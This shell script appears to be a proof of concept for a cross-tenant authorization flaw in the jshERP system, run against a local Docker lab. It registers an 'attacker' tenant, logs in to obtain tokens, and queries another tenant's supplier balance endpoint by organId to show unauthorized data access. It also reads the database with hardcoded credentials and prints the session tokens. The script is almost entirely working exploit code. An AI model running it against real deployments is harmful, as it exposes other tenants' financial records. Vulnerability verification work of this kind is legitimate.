#!/bin/sh
set -e
BASE='http://127.0.0.1:9999/jshERP-boot'
P='e10adc3949ba59abbe56e057f20f883e'
ORGAN_ID=74
ATTACKER="pocx$(date +%s)"

login_token() {
  user="$1"
  docker exec jsherp33-app sh -lc "curl -s -X POST $BASE/user/login -H 'Content-Type: application/json' -d '{\"loginName\":\"$user\",\"password\":\"$P\"}'" \
  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
}

# Create a fresh attacker tenant for cross-tenant probe
REG_PAYLOAD="{\"loginName\":\"$ATTACKER\",\"password\":\"$P\"}"
echo "[Setup] register attacker user: $ATTACKER"
docker exec jsherp33-app sh -lc "curl -s -X POST '$BASE/user/registerUser' -H 'Content-Type: application/json' -d '$REG_PAYLOAD'"
echo

TOKEN_JSH="$(login_token jsh)"
TOKEN_ATTACK="$(login_token $ATTACKER)"

echo "[DB] target supplier"
docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=$ORGAN_ID;\""

echo "[Expected owner tenant=63] jsh query"
docker exec jsherp33-app sh -lc "curl -s '$BASE/supplier/getBeginNeedByOrganId?organId=$ORGAN_ID' -H 'X-Access-Token: $TOKEN_JSH'"

echo "\n[PoC] attacker tenant=132 query same organId"
docker exec jsherp33-app sh -lc "curl -s '$BASE/supplier/getBeginNeedByOrganId?organId=$ORGAN_ID' -H 'X-Access-Token: $TOKEN_ATTACK'"

echo "\n[Context]"
echo "jsh token: $TOKEN_JSH"
echo "attacker token: $TOKEN_ATTACK"
echo "attacker login: $ATTACKER"
